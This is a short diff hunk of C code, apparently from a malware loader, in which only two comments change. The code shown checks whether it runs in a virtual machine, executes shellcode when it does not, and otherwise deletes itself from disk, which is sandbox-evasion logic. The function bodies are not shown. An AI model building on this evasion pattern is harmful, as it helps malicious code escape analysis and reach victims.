@@ -17,13 +17,13 @@ int main(){
 	
 	if(VmDetection(process_per_user)){
 		
-		// TODO: ShellcodeDetonation
+		// ShellcodeDetonation
 		PRINT("[i] Executing shellcode!\n");
 		InlinedShellcodeExecution();
 		
 	}else{
 		
-		// TODO: SelfDelete
+		// SelfDelete
 		PRINT("[i] VM Detected. Self-deleting!\n");
 		DeleteSelfFromDisk();
 		
